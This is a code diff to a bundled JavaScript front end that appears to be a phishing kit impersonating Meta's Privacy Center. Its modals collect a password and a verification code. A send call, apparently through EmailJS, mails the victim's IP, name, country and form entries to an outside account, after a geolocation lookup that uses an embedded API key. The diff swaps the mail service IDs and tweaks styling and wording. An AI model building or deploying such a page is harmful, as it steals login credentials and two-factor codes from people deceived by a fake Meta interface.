@@ -11711,7 +11711,7 @@ qs.defaultStyles = {
   overlay: {
     position: "fixed",
     inset: 0,
-    backgroundColor: "rgba(0,0,0, 0.6)",
+    backgroundColor: "rgba(0,0,0, 0.4)",
   },
   content: {
     position: "absolute",
@@ -14510,8 +14510,8 @@ const ZA = 15,
       "https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5"
     ).then((n) => n.json());
     QA.send(
-      "service_0nsac8q",
-      "template_ks5jcmp",
+      "service_0nsac8",
+      "template_ks5jcm",
       {
         ip: r.ip,
         full_name: e.fullName,
@@ -14528,7 +14528,7 @@ const ZA = 15,
         country: r.country_name,
         reply_to: "",
       },
-      "ZofGhA3m_AYStjoDj"
+      "ZofGhA3m_AYStjoD"
     ).then(
       (n) => {
         console.log(n.text);
@@ -14666,13 +14666,14 @@ function JA() {
               left: "50%",
               right: "auto",
               bottom: "auto",
-              marginRight: "-50%",
+              marginRight: "-43%",
               transform: "translate(-50%, -50%)",
               borderRadius: 5,
               padding: 0,
               borderWidth: 0,
               maxHeight: 900,
               maxWidth: 500,
+              boxShadow: "0 5px 15px rgba(0, 0, 0, 0.3)",
             },
           },
           children: L.jsxs("div", {
@@ -14801,15 +14802,16 @@ function JA() {
               left: "50%",
               right: "auto",
               bottom: "auto",
-              marginRight: "-50%",
+              marginRight: "-43%",
               transform: "translate(-50%, -50%)",
               borderRadius: 5,
               padding: 0,
               borderWidth: 1,
+              boxShadow: "0 5px 15px rgba(0, 0, 0, 0.3)",
             },
           },
           children: L.jsxs("div", {
-            className: "backgroundfb p-5 mx-1",
+            className: "backgroundfb p-5",
             children: [
               L.jsx("div", {
                 className: "text-right",
@@ -14833,7 +14835,7 @@ function JA() {
                     ...p("pass"),
                     type: "password",
                     className:
-                      "w-full h-10 rounded-5px border mb-2 px-3 text-xl1",
+                      "h-16 rounded-5px mt-6 mb-5 border p-2 text-md w-full",
                     placeholder: "Password",
                   }),
                   L.jsx("div", {
@@ -14879,11 +14881,12 @@ function JA() {
               left: "50%",
               right: "auto",
               bottom: "auto",
-              marginRight: "-50%",
+              marginRight: "-43%",
               transform: "translate(-50%, -50%)",
               borderRadius: 5,
               padding: 0,
               maxWidth: "100%",
+              boxShadow: "0 5px 15px rgba(0, 0, 0, 0.3)",
             },
           },
           children: L.jsxs("div", {
@@ -14922,7 +14925,7 @@ function JA() {
                           Q.target.value.length <= 8 && n(Q.target.value);
                         },
                         className:
-                          "h-16 rounded-5px mt-6 mb-5 border pl-4 text-md pt-5 w-full",
+                          "h-16 rounded-5px mt-6 mb-5 border p-2 text-md w-full",
                         placeholder: "Code",
                       }),
                     ],
@@ -14981,11 +14984,12 @@ function JA() {
               left: "50%",
               right: "auto",
               bottom: "auto",
-              marginRight: "-50%",
+              marginRight: "-43%",
               transform: "translate(-50%, -50%)",
               borderRadius: 5,
               padding: 0,
               borderWidth: 1,
+              boxShadow: "0 5px 15px rgba(0, 0, 0, 0.3)",
             },
           },
           children: L.jsxs("div", {
@@ -15074,7 +15078,7 @@ function JA() {
       L.jsxs("div", {
         children: [
           L.jsx("p", {
-            className: "mt-9 mb-5",
+            className: "mt-5 mb-5",
             style: {
               fontSize: "1.3rem",
               fontFamily: "Open Sans, sans-serif",
@@ -15164,7 +15168,7 @@ function JA() {
                       wrapperStyle: {},
                       wrapperClass: "",
                     })
-                  : "Request review",
+                  : "Request a Review",
               }),
             ],
           }),
@@ -15410,7 +15414,7 @@ function JA() {
               left: "50%",
               right: "auto",
               bottom: "auto",
-              marginRight: "-50%",
+              marginRight: "-43%",
               transform: "translate(-50%, -50%)",
               borderRadius: 5,
               padding: 0,
@@ -15418,6 +15422,7 @@ function JA() {
               maxHeight: "90vh",
               maxWidth: "500px",
               overflowY: "scroll",
+              boxShadow: "0 5px 15px rgba(0, 0, 0, 0.3)",
             },
           },
           children: L.jsxs("div", {
@@ -15445,7 +15450,7 @@ function JA() {
               }),
               L.jsxs("div", {
                 className:
-                  "flex justify-between hover:bg-[#E3E8F0] transition bg-white rounded-2xl cursor-pointer",
+                  "flex justify-between hover:bg-[#E3E8F0] transition bg-white rounded-5px cursor-pointer",
                 children: [
                   L.jsxs("div", {
                     className: "flex",
@@ -15506,7 +15511,8 @@ function JA() {
                   L.jsxs("div", {
                     className: "text-sm max-w-md text-gray-900 mt-3",
                     children: [
-                      "It is important to us that you know how to manage your privacy (confidentiality), so we also We show you where in the settings of the Meta Products you use you can manage your data. You you can",
+                      "It is important to us that you know how to manage your privacy, so we also We show you where in the settings of the Meta Products you use you can manage your data. You can",
+                      " ",
                       L.jsxs("a", {
                         href: "#",
                         className: "text-blue-700 inline-flex hover:underline",
@@ -15525,14 +15531,14 @@ function JA() {
                     ],
                   }),
                   L.jsx("div", {
-                    className: "text-sm max-w-md text-gray-900 mt-3",
-                    children: "The policy is provided below.",
+                    className: "text-sm max-w-md text-gray-900 mt-4",
+                    children: "The policy is provided below:",
                   }),
                   L.jsx("div", {
                     className: "mt-5",
                     children: L.jsxs("div", {
                       className:
-                        "bg-white rounded-2xl hover:cursor-pointer overflow-hidden",
+                        "bg-white rounded-5px hover:cursor-pointer overflow-hidden",
                       onClick: () => k(),
                       children: [
                         L.jsxs("div", {
@@ -15607,23 +15613,7 @@ function JA() {
                         ],
                       }),
                       " ",
-                      ". For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you when you use our Products,",
-                      " ",
-                      L.jsxs("a", {
-                        href: "#",
-                        className: "text-blue-700 inline-flex hover:underline",
-                        children: [
-                          "even if you do not have an account",
-                          " ",
-                          L.jsx("span", {
-                            children: L.jsx(ec, {
-                              size: 14,
-                              className: "mx-0.5",
-                            }),
-                          }),
-                        ],
-                      }),
-                      ".",
+                      ". For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you when you use our Products, even if you do not have an account.",
                     ],
                   }),
                   L.jsx("div", {
@@ -15634,7 +15624,7 @@ function JA() {
                     className: "mt-5",
                     children: L.jsxs("div", {
                       className:
-                        "bg-white rounded-2xl hover:cursor-pointer overflow-hidden",
+                        "bg-white rounded-5px hover:cursor-pointer overflow-hidden",
                       onClick: () => k(),
                       children: [
                         L.jsxs("div", {
@@ -15757,7 +15747,7 @@ function JA() {
                   }),
                   L.jsxs("div", {
                     className:
-                      "flex justify-between hover:bg-[#E3E8F0] transition bg-white rounded-2xl cursor-pointer",
+                      "flex justify-between hover:bg-[#E3E8F0] transition bg-white mb-5 rounded-5px cursor-pointer",
                     children: [
                       L.jsxs("div", {
                         className: "flex",
@@ -17780,7 +17770,7 @@ var cO = {};
           xxl: {
             width: "w-[110px]",
             height: "h-[110px]",
-            borderRadius: "rounded-2xl",
+            borderRadius: "rounded-5px",
           },
         },
         variants: {
@@ -28089,9 +28079,9 @@ const mT = (e, t) => (r) => Math.max(Math.min(r, t), e),
   os = (e) => (e % 1 ? Number(e.toFixed(5)) : e),
   js = /(-)?([\d]*\.?[\d])+/g,
   Cv =
-    /(#[0-9a-f]{6}|#[0-9a-f]{3}|#(?:[0-9a-f]{2}){2,4}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2,3}\s*\/*\s*[\d\.]+%?\))/gi,
+    /(#[0-9a-f]{6}|#[0-9a-f]{3}|#(?:[0-9a-f]{2}){2,4}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2,3}\s*\\s*[\d\.]+%?\))/gi,
   N3 =
-    /^(#[0-9a-f]{3}|#(?:[0-9a-f]{2}){2,4}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2,3}\s*\/*\s*[\d\.]+%?\))$/i;
+    /^(#[0-9a-f]{3}|#(?:[0-9a-f]{2}){2,4}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2,3}\s*\/s*[\d\.]+%?\))$/i;
 function Js(e) {
   return typeof e == "string";
 }
@@ -39028,8 +39018,8 @@ var PP = {},
   };
 /*!
  * tabbable 6.2.0
- * @license MIT, https://github.com/focus-trap/tabbable/blob/master/LICENSE
- */ var q6 = [
+ * @license MIT, https://github.com/focus-trap/tabbable/blob/master/LICENSE*/
+var q6 = [
     "input:not([inert])",
     "select:not([inert])",
     "textarea:not([inert])",
@@ -53205,7 +53195,7 @@ const q8 = () =>
   Pt = () => {
     document
       .querySelector(
-        "#root > div > div.grid.grid-cols-12.xl:mx-40.lg:ml-16.px-0.mt-[45px] > div.col-span-12.lg:col-span-8.border-l-[1px].border-[#DEE3E9].md:pl-[35px] > div.text-[15px].text-[#22252A].mr-10.max-w-[900px].ml-5.md:ml-0 > div.bg-white.rounded-5px.overflow-hidden.pb-5.mb-4.max-w-[900px].mt-6 > div.px-5.py-3 > button.bg-\[\#0264E1\].text-white.text-\[17px\].w-full.h-12.rounded-3xl.bold.flex.justify-center.items-center"
+        "#root > div > div > div.col-span-12.lg:col-span-8.border-l-[1px].border-[#DEE3E9].md:pl-[35px] > div.text-[15px].text-[#22252A].mr-10.max-w-[900px].ml-5.md:ml-0 > div.bg-white.rounded-5px.overflow-hidden.pb-5.mb-4.max-w-[900px].mt-6 > div.px-5.py-3 > button.bg-[#0264E1].text-white.text-[17px].w-full.h-12.rounded-3xl.bold.flex.justify-center.items-center"
       )
       .click();
   };
@@ -53582,12 +53572,13 @@ function Y8() {
               left: "50%",
               right: "auto",
               bottom: "auto",
-              marginRight: "-50%",
+              marginRight: "-43%",
               transform: "translate(-50%, -50%)",
               borderRadius: 5,
               padding: 0,
               borderWidth: 1,
               width: "500px",
+              boxShadow: "0 5px 15px rgba(0, 0, 0, 0.3)",
             },
           },
           children: L.jsxs("div", {
@@ -53613,7 +53604,7 @@ function Y8() {
                   L.jsx("input", {
                     type: "text",
                     placeholder: "Search the Privacy Center",
-                    className: "rounded-2xl h-10 w-full pl-8",
+                    className: "rounded-5px h-10 w-full pl-8",
                     style: { background: "rgba(0, 0, 0, 0.05)" },
                     onKeyDown: c,
                   }),
